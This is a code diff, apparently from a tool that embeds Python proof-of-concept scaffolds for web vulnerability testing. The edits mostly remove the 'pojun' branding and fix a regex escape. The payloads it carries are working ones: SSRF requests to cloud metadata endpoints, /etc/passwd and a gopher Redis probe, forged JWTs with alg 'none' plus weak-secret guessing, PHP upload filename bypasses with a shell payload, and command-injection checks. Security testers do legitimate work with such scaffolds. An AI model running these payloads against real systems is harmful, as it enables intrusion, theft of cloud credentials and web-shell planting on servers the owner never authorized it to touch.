@@ -30,7 +30,7 @@ import (
 
 const pocCommon = `#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""pojun PoC scaffold (__CLASS__) — edit these three spots to use:
+"""PoC scaffold (__CLASS__) — edit these three spots to use:
    BASE  = target address (argv[1] can override)
    PARAM = parameter name (argv[2])
    PAYLOADS = payload list
@@ -118,7 +118,7 @@ for p in PATHS:
 finish(hits, len(PATHS))
 `,
 	"ssrf": `# first replace CANARY with your own callback/HTTP-log address; metadata addresses only get read-only GETs
-CANARY = "http://127.0.0.1:9/pojun-ssrf-canary"
+CANARY = "http://127.0.0.1:9/canary"
 TARGETS = [CANARY, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING"]
 hits = []
 for p in TARGETS:
@@ -169,7 +169,7 @@ for alg in ("none", "None", "NONE"):
     if st == 200:
         print("MATCH jwt-none alg=%s" % alg)
 # weak secret
-SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin", "pojun"]
+SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin"]
 hits = []
 for sec in SECRETS:
     s = b64e(hmac.new(sec.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
@@ -181,8 +181,8 @@ finish(hits, len(SECRETS))
 	"upload": `# usage: python3 thisfile <upload_url> <param> [shell_content]
 UPLOAD = BASE
 FIELD = PARAM
-SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'pojun'; ?>"
-BOUND = "----pojun%d" % int(time.time())
+SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'ok'; ?>"
+BOUND = "----%d" % int(time.time())
 NAMES = ["poc.php", "poc.php.jpg", "poc.php%00.jpg", "poc.pHp", "poc.php5", ".htaccess"]
 hits = []
 for name in NAMES:
@@ -206,7 +206,7 @@ for p in PAYLOADS:
     st, _, bd, ms = fetch(inject(BASE, PARAM, p))
     show(p, st, bd, ms)
     low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
-    if re.search(r"uid=\\d+\\(", low) or re.search(r"(?i)(windows|nt authority|administrator)", low):
+    if re.search(r"uid=\d+\(", low) or re.search(r"(?i)(windows|nt authority|administrator)", low):
         hits.append(p); print("MATCH cmdi payload=%r status=%s" % (p, st))
 finish(hits, len(PAYLOADS))
 `,
